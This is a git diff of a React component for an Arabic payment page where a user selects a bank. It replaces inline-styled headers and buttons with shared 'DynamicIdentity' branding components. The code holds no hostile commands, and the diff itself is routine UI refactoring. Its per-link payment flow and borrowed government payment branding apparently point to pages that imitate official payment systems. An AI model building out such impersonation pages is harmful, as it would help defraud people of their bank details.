@@ -11,6 +11,8 @@ import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 import { formatCurrency } from "@/lib/countryCurrencies";
+import { DynamicIdentity, EntityHeader, EntityContainer, EntityButton } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentBankSelector = () => {
   const { id } = useParams();
@@ -61,6 +63,9 @@ const PaymentBankSelector = () => {
   // Get saved currency code from payment_data or shipping info
   const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
+  
+  // Bank pages always use bank_pages entity type
+  const entityType = 'bank_pages';
   
   // Load banks when country is available from link data
   useEffect(() => {
@@ -166,6 +171,8 @@ const PaymentBankSelector = () => {
   }
   
   return (
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
     <div 
       className="min-h-screen py-4 sm:py-12 bg-background" 
       dir="rtl"
@@ -175,33 +182,14 @@ const PaymentBankSelector = () => {
     >
       <div className="container mx-auto px-4 max-w-2xl">
         {/* Header */}
-        <div className="mb-6">
-          <button
-            onClick={() => navigate(`/pay/${id}/details`)}
-            className="flex items-center gap-2 text-sm mb-4"
-            style={{ color: govSystem.colors.textLight }}
-          >
-            <ArrowLeft className="w-4 h-4" />
-            <span>رجوع</span>
-          </button>
-          
-          <div className="flex items-center gap-3 mb-2">
-            <div
-              className="w-12 h-12 rounded-full flex items-center justify-center"
-              style={{
-                background: govSystem.gradients.primary,
-              }}
-            >
-              <Building2 className="w-6 h-6 text-white" />
-            </div>
-            <div>
-              <h1 className="text-2xl font-bold" style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}>اختر البنك</h1>
-              <p className="text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
-                {govSystem.nameAr} - {formattedAmount}
-              </p>
-            </div>
-          </div>
-        </div>
+        <EntityHeader
+          entityType={entityType}
+          title="اختر البنك"
+          subtitle={`${govSystem.nameAr} - ${formattedAmount}`}
+          showLogo={true}
+          animateImages={true}
+          className="mb-6"
+        />
 
         {/* Country Badge */}
         {countryData && (
@@ -341,26 +329,24 @@ const PaymentBankSelector = () => {
 
             {/* Action Buttons */}
             <div className="space-y-3">
-              <Button
+              <EntityButton
+                entityType={entityType}
+                variant="primary"
                 onClick={handleContinue}
                 disabled={!selectedBank}
                 className="w-full h-12 text-base font-semibold"
-                style={{
-                  background: selectedBank
-                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-                    : undefined,
-                }}
               >
                 متابعة
-              </Button>
+              </EntityButton>
               
-              <Button
-                onClick={handleSkip}
+              <EntityButton
+                entityType={entityType}
                 variant="outline"
+                onClick={handleSkip}
                 className="w-full h-12 text-base"
               >
                 تخطي واستخدام أي بنك
-              </Button>
+              </EntityButton>
             </div>
 
             {/* Info Note */}
@@ -373,6 +359,8 @@ const PaymentBankSelector = () => {
         )}
       </div>
     </div>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
